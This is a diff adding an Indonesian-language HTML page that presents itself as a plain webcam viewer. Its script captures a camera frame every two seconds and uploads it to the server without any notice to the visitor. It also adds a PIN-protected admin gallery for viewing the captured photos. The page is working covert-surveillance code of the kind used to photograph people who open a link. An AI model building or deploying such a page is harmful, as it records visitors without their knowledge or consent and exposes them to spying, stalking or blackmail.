@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Kamera Web</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      background-color: #ffffff;
+      color: #000000;
+      font-family: Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+    }
+
+    .gear-btn {
+      position: fixed;
+      top: 15px;
+      right: 15px;
+      background: none;
+      border: none;
+      font-size: 28px;
+      cursor: pointer;
+      z-index: 10;
+      padding: 5px;
+    }
+
+    video {
+      width: 90%;
+      max-width: 500px;
+      border-radius: 8px;
+    }
+
+    canvas {
+      display: none;
+    }
+
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #ffffff;
+      z-index: 100;
+      overflow-y: auto;
+      padding: 20px;
+    }
+
+    .modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid #ddd;
+    }
+
+    .close-btn {
+      background: #ff4d4d;
+      color: white;
+      border: none;
+      padding: 8px 16px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    .gallery-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+      gap: 15px;
+    }
+
+    .gallery-grid img {
+      width: 100%;
+      height: auto;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+    }
+  </style>
+</head>
+<body>
+
+  <button class="gear-btn" onclick="openAdminGallery()" title="Admin Galeri">⚙️</button>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <div id="galleryModal" class="modal">
+    <div class="modal-header">
+      <h2>Galeri Foto Server</h2>
+      <button class="close-btn" onclick="closeGallery()">Tutup</button>
+    </div>
+    <div class="gallery-grid" id="galleryGrid"></div>
+  </div>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    const galleryGrid = document.getElementById('galleryGrid');
+    const modal = document.getElementById('galleryModal');
+
+    // 1. Jalankan Kamera
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+      .then((stream) => {
+        video.srcObject = stream;
+        // Ambil dan upload foto otomatis setiap 2 detik (2000 ms)
+        setInterval(takeAndUploadPhoto, 2000);
+      })
+      .catch((err) => {
+        console.error("Gagal akses kamera:", err);
+      });
+
+    // 2. Fungsi Ambil Frame & Kirim ke Server
+    function takeAndUploadPhoto() {
+      if (video.videoWidth === 0 || video.videoHeight === 0) return;
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Ubah canvas ke format Blob JPEG
+      canvas.toBlob(async (blob) => {
+        if (!blob) return;
+
+        const formData = new FormData();
+        formData.append('photo', blob, 'capture.jpg');
+
+        try {
+          await fetch('/api/upload', {
+            method: 'POST',
+            body: formData
+          });
+        } catch (err) {
+          console.error("Gagal mengunggah foto ke server:", err);
+        }
+      }, 'image/jpeg', 0.8);
+    }
+
+    // 3. Buka Galeri Admin dengan Masukkan PIN
+    async function openAdminGallery() {
+      const inputPin = prompt("Masukkan Kode Akses:");
+      if (!inputPin) return;
+
+      try {
+        const response = await fetch('/api/admin/photos', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ password: inputPin })
+        });
+
+        const result = await response.json();
+
+        if (response.ok && result.ok) {
+          renderGallery(result.photos);
+          modal.style.display = "block";
+        } else {
+          alert(result.error || "Kode salah!");
+        }
+      } catch (err) {
+        alert("Gagal menghubungi server.");
+      }
+    }
+
+    // 4. Render Hasil Foto dari Server
+    function renderGallery(photos) {
+      galleryGrid.innerHTML = "";
+      if (photos.length === 0) {
+        galleryGrid.innerHTML = "<p>Belum ada foto tersimpan.</p>";
+        return;
+      }
+      photos.forEach((photo) => {
+        const img = document.createElement('img');
+        img.src = photo.url;
+        galleryGrid.appendChild(img);
+      });
+    }
+
+    function closeGallery() {
+      modal.style.display = "none";
+    }
+  </script>
+
+</body>
+</html>
